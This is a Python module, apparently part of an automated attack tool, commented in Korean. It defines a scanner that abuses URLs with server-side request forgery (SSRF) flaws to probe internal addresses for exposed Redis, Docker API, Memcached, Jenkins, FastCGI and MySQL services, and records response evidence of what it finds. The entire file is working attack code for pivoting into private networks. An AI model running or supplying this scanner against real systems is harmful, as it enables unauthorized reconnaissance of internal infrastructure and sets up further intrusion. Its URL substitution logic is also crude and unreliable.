import requests
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor

console = Console()

class PivotingScanner:
    def __init__(self, ssrf_url):
        self.ssrf_url = ssrf_url # SSRF가 가능한 파라미터가 포함된 URL
        self.internal_ips = ["127.0.0.1", "172.17.0.1", "192.168.0.1", "10.0.0.1"]
        self.critical_ports = [
            6379,  # Redis
            2375,  # Docker API
            11211, # Memcached
            8080,  # Jenkins
            9000,  # FastCGI
            3306   # MySQL
        ]
        self.found_internal_services = []

    def probe_internal(self, ip, port):
        """SSRF를 통해 내부망 서비스 접근 시도"""
        payload = f"http://{ip}:{port}"
        # SSRF URL의 파라미터를 페이로드로 교체
        # 예: target.com/view?url=http://127.0.0.1:6379
        test_url = self.ssrf_url.replace("http", payload) # 간단한 교체 로직
        
        try:
            # 타임아웃과 응답 패턴을 분석하여 포트 오픈 여부 판단
            res = requests.get(test_url, timeout=3, verify=False)
            # 포트마다 특유의 에러 메시지나 응답 확인
            # 예: Redis (-ERR), Docker ({"message":...})
            if res.status_code == 200 or any(sig in res.text for sig in ["-ERR", "Docker", "Jenkins"]):
                self.found_internal_services.append({
                    "service": f"{ip}:{port}",
                    "evidence": res.text[:100]
                })
        except:
            pass

    def run(self):
        console.print(f"[bold red][*][/bold red] Pivoting: Scanning Internal Network via SSRF on {self.ssrf_url}")
        with ThreadPoolExecutor(max_workers=10) as executor:
            for ip in self.internal_ips:
                for port in self.critical_ports:
                    executor.submit(self.probe_internal, ip, port)
        
        return self.found_internal_services

def run_pivoting_scanner(ssrf_vulns):
    """발견된 SSRF 취약점들을 기반으로 내부 피보팅 시도"""
    all_internal = []
    for vuln in ssrf_vulns:
        pivoter = PivotingScanner(vuln['url'])
        services = pivoter.run()
        all_internal.extend(services)
    return all_internal
